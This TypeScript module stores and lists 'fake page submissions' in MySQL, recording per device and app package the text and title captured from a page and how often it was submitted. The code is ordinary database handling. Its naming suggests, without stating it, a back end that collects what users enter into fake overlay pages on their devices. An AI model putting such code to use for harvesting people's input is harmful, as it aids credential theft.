import { randomUUID } from "node:crypto";
import type { RowDataPacket } from "mysql2";
import { pool } from "../db/pool.js";

interface FakePageRow extends RowDataPacket {
  id: string;
  device_id: string;
  package_name: string;
  title: string;
  text_content: string;
  submit_count: number;
  captured_at: Date;
  created_at: Date;
}

export interface FakePageSubmission {
  id: string;
  deviceId: string;
  packageName: string;
  title: string;
  text: string;
  submitCount: number;
  capturedAt: Date;
  createdAt: Date;
}

export interface SaveFakePageInput {
  deviceId: string;
  packageName?: string;
  title?: string;
  text: string;
  submitCount?: number;
  capturedAt?: number;
}

function mapRow(row: FakePageRow): FakePageSubmission {
  return {
    id: row.id,
    deviceId: row.device_id,
    packageName: row.package_name ?? "",
    title: row.title ?? "",
    text: row.text_content,
    submitCount: Number(row.submit_count ?? 1),
    capturedAt: row.captured_at,
    createdAt: row.created_at,
  };
}

export async function saveFakePageSubmission(input: SaveFakePageInput): Promise<FakePageSubmission> {
  const text = input.text.trim();
  if (!text) {
    throw new Error("fake_page_text_required");
  }
  const id = randomUUID();
  const capturedAt = input.capturedAt ? new Date(input.capturedAt) : new Date();
  await pool.query(
    `INSERT INTO fake_page_submissions
      (id, device_id, package_name, title, text_content, submit_count, captured_at)
     VALUES (?, ?, ?, ?, ?, ?, ?)`,
    [
      id,
      input.deviceId,
      (input.packageName ?? "").trim(),
      (input.title ?? "").trim(),
      text.slice(0, 512),
      Math.max(1, Number(input.submitCount ?? 1)),
      capturedAt,
    ],
  );
  const [rows] = await pool.query<FakePageRow[]>(
    "SELECT * FROM fake_page_submissions WHERE id = ? LIMIT 1",
    [id],
  );
  return mapRow(rows[0]!);
}

export async function listFakePageSubmissions(input: {
  deviceId: string;
  packageName?: string;
  limit?: number;
}): Promise<FakePageSubmission[]> {
  const limit = Math.min(Math.max(input.limit ?? 100, 1), 500);
  const params: Array<string | number> = [input.deviceId];
  let sql =
    "SELECT * FROM fake_page_submissions WHERE device_id = ?";
  const pkg = input.packageName?.trim();
  if (pkg) {
    sql += " AND package_name = ?";
    params.push(pkg);
  }
  sql += " ORDER BY captured_at DESC LIMIT ?";
  params.push(limit);
  const [rows] = await pool.query<FakePageRow[]>(sql, params);
  return rows.map(mapRow);
}
